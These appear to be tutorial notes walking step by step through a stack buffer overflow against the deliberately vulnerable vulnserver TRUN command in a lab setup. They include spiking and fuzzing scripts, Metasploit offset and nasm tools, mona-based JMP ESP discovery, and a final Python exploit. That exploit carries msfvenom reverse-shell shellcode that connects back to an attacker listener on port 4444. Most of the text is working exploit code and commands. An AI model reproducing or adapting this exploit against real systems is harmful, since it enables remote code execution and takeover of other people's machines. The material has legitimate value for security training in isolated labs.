Buffer Overflow

Anatomy of Memory
	TOP
		Kernel
		Stack
			ESP = Extended Stack Pointer
			Buffer Space 
				grows down from ESP to EBP 
				should stop at EBP
			EBP = Extended Base Pointer
			EIP = Extended Instruction Pointer/Return Address
		Heap
		Data
		Text
	BOTTOM

Spiking - find vulnerable part of app
	generic_send_tcp <target IP> <port> <spike_script> <SKIPVAR> <SKIPSTR>
	Example from vulnserver (commands: STATS, RTIME, TRUN, etc)
		generic_send_tcp 192.168.56.104 9999 stats.spk 0 0
		
		stats.spk contains:
			s_readline();
			s_string("STATS ");
			s_string_variable("0");
		
	repeat for each possibly vulnerable command 
		look for crash
		crash, ESP, and EIP values can be seen in debugger (.e.g Immunity)

Fuzzing - send characters to attempt to break app 
	Fuzzing TRUN command in vulnserv.exe
	bof.py contains:
		#!/usr/bin/python
		import sys, socket
		from time import sleep

		buffer = "A" * 100

		while True:
		  try:
		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    s.connect(("192.168.56.104", 9999))
		    s.send(("TRUN /.:/" + buffer))     
		    	# the /.:/ was added from Immunity debugger spike results
		    s.close()
		    sleep(1)
		    buffer = buffer + "A"*100

		  except:
		    print "Fuzzing crashed at %s bytes" % (str(len(buffer)))
		    sys.exit()

Find offset
	Take output of bof.py and round off to nearest kb.
	Run metaspoloit pattern_create:
	 	/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash bytes rounded>
	Copy output into off.py:
		#!/usr/bin/python
			import sys, socket
		
			offset = "A" * 100

			try:
			    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			    s.connect(("192.168.56.104", 9999))
			    s.send(("TRUN /.:/" + offset))     
			    	# the /.:/ was added from Immunity debugger spike results
			    s.close()

			  except:
			    print "Error connecting to server"
			    sys.exit()		

	Get EIP value from debugger
	Run metaspoloit pattern_create:
	 	/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <crash bytes rounded> -q <EIP finding>
	Get Offset

Overwrite EIP - point at shellcode
	Run overwrite.py using discovered offset:

		#!/usr/bin/python
			import sys, socket

			# offset is discovered using off.py and pattern_offset.rb
			offset = 2003

			# for testing EIP is <offset> bytes in and 4 bytes long
			shellcode = "A" * offset + "B" * 4

			try:
			    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			    s.connect(("192.168.56.104", 9999))
			    s.send(("TRUN /.:/" + shellcode))     
			           # the /.:/ was added from Immunity debugger spike results
			    s.close()

			except:
			    print ("Error connecting to server")
			    sys.exit()

	Debugger should show 41414141 (i.e. AAAA) in EBP and 42424242 (i.e. BBBB) in EIP - confirms we can control the EIP

Find bad characters
	manually test using badchars from:
	https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/

	null byte (\x00) is already likely bad, so can remove at start

	add badchars to badchar.py:

			#!/usr/bin/python
			import sys, socket

			# offset is discovered using off.py and pattern_offset.rb
			offset = 2003

			# testing for bad characters for shellcode
			badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
			"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
			"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
			"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
			"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
			"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
			"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
			"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

			# for testing EIP is <offset> bytes in and 4 bytes long
			shellcode = "A" * offset + "B" * 4 + badchars

			try:
			    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			    s.connect(("192.168.56.104", 9999))
			    s.send(("TRUN /.:/" + shellcode))     
			           # the /.:/ was added from Immunity debugger spike results
			    s.close()

			except:
			    print ("Error connecting to server")
			    sys.exit()

	In debugger, right-click ESP and select Follow in Dump
		Look for hex bytes between 00 and FF out of sequence 
			these are the bad characters - cannot be in our shellcode

Find right module
	Get mona.py from https://github.com/corelan/mona
	Add mona.py to Immunity Debugger PyCommands folder:
		C:\Program Files(x86)\Immunity Inc\Immunity Debugger\PyCommands\
	In Immunity's bottom text bar type: ! mona modules
		looking for modules with all or mostly FALSE for protections
		in this example essfunc.dll is all FALSE

	Need to convert JMP assembly command to hex using nasm_shell.rb:
		/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
		nasm > JMP ESP					#this is FFE4
		nasm > exit 					#exits nasm

	In Immunity's bottom text bar type: 
		! mona find -s "\xff\xe4" -m essfunc.dll 
		looking for return address (first column) in results 
			these are in big endian format

	Modify module.py using discovered return address(es):

		#!/usr/bin/python
		import sys, socket

		# offset is discovered using off.py and pattern_offset.rb
		offset = 2003

		# return address is discovered using mona in Immunity - here it must be little endian for x86 architecture
		returnaddress = "\xaf\x11\x50\x62"

		# for testing EIP is <offset> bytes in and 4 bytes long
		shellcode = "A" * offset + returnaddress 


		try:
		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    s.connect(("192.168.56.104", 9999))
		    s.send(("TRUN /.:/" + shellcode))     
		           # the /.:/ was added from Immunity debugger spike results
		    s.close()

		except:
		    print ("Error connecting to server")
		    sys.exit()

	In Immunity:
		minimize mona results window
		select Go To Address in Disassembler icon (blue arrow pointing at dotted line/stack)
			enter return address (big endian)
			Press F2 to set break point on this address

	Run module.py
		should crash and return EIP <return address> <vulnerable module>.<return address>
			e.g. EIP 625011AF essfunc.625011AF
		we control EIP!

Generate shellcode using msfvenom
	msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> EXITFUNC=thread -f c -a x86 -b "\x00<and any other bad characters"

	e.g. msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.125 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

	Provide returned payload in exploit.py
		#!/usr/bin/python
		import sys, socket

		# offset is discovered using off.py and pattern_offset.rb
		offset = 2003

		# return address is discovered using mona in Immunity - here it must be little endian for x86 architecture
		returnaddress = "\xaf\x11\x50\x62"

		# overflow payload produced by msfvenom
		overflow = ("\xbf\x4c\x83\x38\xa0\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
		"\x52\x83\xc2\x04\x31\x7a\x0e\x03\x36\x8d\xda\x55\x3a\x79\x98"
		"\x96\xc2\x7a\xfd\x1f\x27\x4b\x3d\x7b\x2c\xfc\x8d\x0f\x60\xf1"
		"\x66\x5d\x90\x82\x0b\x4a\x97\x23\xa1\xac\x96\xb4\x9a\x8d\xb9"
		"\x36\xe1\xc1\x19\x06\x2a\x14\x58\x4f\x57\xd5\x08\x18\x13\x48"
		"\xbc\x2d\x69\x51\x37\x7d\x7f\xd1\xa4\x36\x7e\xf0\x7b\x4c\xd9"
		"\xd2\x7a\x81\x51\x5b\x64\xc6\x5c\x15\x1f\x3c\x2a\xa4\xc9\x0c"
		"\xd3\x0b\x34\xa1\x26\x55\x71\x06\xd9\x20\x8b\x74\x64\x33\x48"
		"\x06\xb2\xb6\x4a\xa0\x31\x60\xb6\x50\x95\xf7\x3d\x5e\x52\x73"
		"\x19\x43\x65\x50\x12\x7f\xee\x57\xf4\x09\xb4\x73\xd0\x52\x6e"
		"\x1d\x41\x3f\xc1\x22\x91\xe0\xbe\x86\xda\x0d\xaa\xba\x81\x59"
		"\x1f\xf7\x39\x9a\x37\x80\x4a\xa8\x98\x3a\xc4\x80\x51\xe5\x13"
		"\xe6\x4b\x51\x8b\x19\x74\xa2\x82\xdd\x20\xf2\xbc\xf4\x48\x99"
		"\x3c\xf8\x9c\x0e\x6c\x56\x4f\xef\xdc\x16\x3f\x87\x36\x99\x60"
		"\xb7\x39\x73\x09\x52\xc0\x14\xf6\x0b\xf2\x99\x9e\x49\x02\x73"
		"\x03\xc7\xe4\x19\xab\x81\xbf\xb5\x52\x88\x4b\x27\x9a\x06\x36"
		"\x67\x10\xa5\xc7\x26\xd1\xc0\xdb\xdf\x11\x9f\x81\x76\x2d\x35"
		"\xad\x15\xbc\xd2\x2d\x53\xdd\x4c\x7a\x34\x13\x85\xee\xa8\x0a"
		"\x3f\x0c\x31\xca\x78\x94\xee\x2f\x86\x15\x62\x0b\xac\x05\xba"
		"\x94\xe8\x71\x12\xc3\xa6\x2f\xd4\xbd\x08\x99\x8e\x12\xc3\x4d"
		"\x56\x59\xd4\x0b\x57\xb4\xa2\xf3\xe6\x61\xf3\x0c\xc6\xe5\xf3"
		"\x75\x3a\x96\xfc\xac\xfe\xb6\x1e\x64\x0b\x5f\x87\xed\xb6\x02"
		"\x38\xd8\xf5\x3a\xbb\xe8\x85\xb8\xa3\x99\x80\x85\x63\x72\xf9"
		"\x96\x01\x74\xae\x97\x03")

		# the buffer is filled with A to the offset, the return address is provided for the
		# vulnerable module, 32 NOPS are provided to pad overflow, then the reverse shell
		# payload is provided. Experiment with the number of NOPS required to make exploit stable
		shellcode = "A" * offset + returnaddress + "\x90" *32 + overflow 


		try:
		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    s.connect(("192.168.56.104", 9999))
		    s.send(("TRUN /.:/" + shellcode))     
		           # the /.:/ was added from Immunity debugger spike results
		    s.close()

		except:
		    print ("Error connecting to server")
		    sys.exit()

	Run nc listener on port 4444 on attacker machine
	Run exploit.py


